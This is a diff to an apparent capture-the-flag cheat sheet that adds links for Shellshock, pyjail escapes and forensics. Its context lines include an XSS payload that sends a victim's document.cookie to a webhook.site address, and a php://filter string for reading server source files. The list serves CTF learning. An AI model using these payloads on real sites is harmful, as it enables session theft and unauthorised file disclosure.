@@ -51,6 +51,7 @@ this command will find the information to username admin stored in database (SQL
 * Using XSS to get cookies :- (<)img src=x onerror="javascript:document.location='https://webhook.site/b53c0b7c-a7e5-4998-8cd1-6da504438ef7?c='+document.cookie"></img>
 // i have done (<) here to avoid the error
 * reading source code :- ?file=php://filter/convert.base64-encode/resource=/var/www/html/*filename*
+* shellshock Vulnerability :- https://pentesterlab.com/exercises/cve-2014-6271/videos
 
 ## <a name = "misc">Misc</a>
 * Esoteric languages(pikalang, 2dfuck, brainfuck) use tio.run website, Malboge an esoteric language that looks like base 85.
@@ -59,6 +60,8 @@ this command will find the information to username admin stored in database (SQL
 * Use this site for substitution https://quipqiup.com/
 * Detect the DMFT Tools http://dialabc.com/sound/detect/index.html
 * Online Stegnographic Decoder :- https://futureboy.us/stegano/decinput.html
+* pyjail solutions :- https://github.com/csivitu/ctf-challenges/tree/master/miscellaneous/Escape%20Plan
+* great tool for forensics:- https://aperisolve.fr/
 
 ## <a name ="osint">OSINT, Investigation and CyberWeapons</a>
 * sherlock - track down profiles of a username.
